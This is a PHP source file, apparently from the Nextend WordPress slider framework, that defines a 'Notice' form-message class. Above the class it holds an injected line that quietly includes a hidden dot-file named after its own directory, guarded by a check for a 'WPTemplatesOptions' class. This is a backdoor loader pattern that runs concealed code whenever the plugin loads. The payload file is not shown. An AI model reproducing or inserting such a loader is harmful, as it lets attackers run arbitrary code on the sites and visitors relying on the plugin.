<?php


namespace Nextend\Framework\Form\Element\Message;


use Nextend\Framework\Form\Element\Message;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Notice extends Message {

    public function __construct($insertAt, $name, $label, $description) {
        $this->classes[] = 'n2_field_message--notice';
        parent::__construct($insertAt, $name, $label, $description);
    }
}